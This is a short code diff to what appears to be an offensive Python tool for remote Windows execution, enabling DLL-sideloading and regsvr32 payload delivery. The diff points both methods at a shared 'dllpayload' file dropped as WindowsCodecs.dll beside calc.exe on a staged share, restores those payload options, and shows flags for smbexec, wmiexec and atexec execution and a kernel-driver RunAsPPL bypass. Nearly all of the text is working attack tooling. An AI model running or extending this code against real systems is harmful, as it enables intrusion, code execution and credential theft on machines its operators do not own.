@@ -1123,7 +1123,7 @@ def gen_payload_dllsideload(share_name, addresses_array):
     os.system('sudo cp {}/src/calc /var/tmp/{}/calc.exe'.format(cwd, share_name))
     os.system('sudo chmod uog+rx /var/tmp/{}/calc.exe'.format(share_name))
 
-    os.system('sudo cp {}/src/WindowsCodecs /var/tmp/{}/WindowsCodecs.dll'.format(cwd, share_name))
+    os.system('sudo cp {}/src/dllpayload /var/tmp/{}/WindowsCodecs.dll'.format(cwd, share_name))
     os.system('sudo chmod uog+rx /var/tmp/{}/WindowsCodecs.dll'.format(share_name))
 
     with open('/var/tmp/{}/address.txt'.format(share_name), 'w') as f:
@@ -1135,7 +1135,7 @@ def gen_payload_dllsideload(share_name, addresses_array):
 def gen_payload_regsvr32(share_name, payload_name, addresses_array):
     addresses_file = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
 
-    os.system('sudo cp {}/src/regsvr32payload /var/tmp/{}/{}.dll'.format(cwd, share_name, payload_name))
+    os.system('sudo cp {}/src/dllpayload /var/tmp/{}/{}.dll'.format(cwd, share_name, payload_name))
     os.system('sudo chmod uog+rx /var/tmp/{}/{}.dll'.format(share_name, payload_name))
 
     with open('/var/tmp/{}/{}.txt'.format(share_name, addresses_file), 'w') as f:
@@ -1712,7 +1712,7 @@ if __name__ == '__main__':
     parser.add_argument('-timeout', action='store', type=int, default=90, help='Set the timeout in seconds for each thread default=90')
     parser.add_argument('-method', action='store', default='smbexec', choices=['wmiexec', 'atexec', 'smbexec'], help='Choose a method to execute the commands')
     #parser.add_argument('-payload', '-p', action='store', default='msbuild', choices=['msbuild', 'regsvr32', 'dllsideload', 'exe'], help='Choose a payload type')
-    parser.add_argument('-payload', '-p', action='store', default='exe', choices=['exe'], help='Choose a payload type')
+    parser.add_argument('-payload', '-p', action='store', default='regsvr32', choices=['regsvr32', 'dllsideload', 'exe'], help='Choose a payload type')
     parser.add_argument('-payloadname', action='store', help='Set the name for the payload file Default=random')
     parser.add_argument('-ip', action='store', help='Your local ip or network interface for the remote device to connect to')
     parser.add_argument('-runasppl', action='store_true', default=False, help='Attempts to bypass RunAsPPL (WARNING THIS USES A SYSTEM DRIVER AND INTERACTS AT A KERNEL LEVEL DO NOT USE IN PROD)')
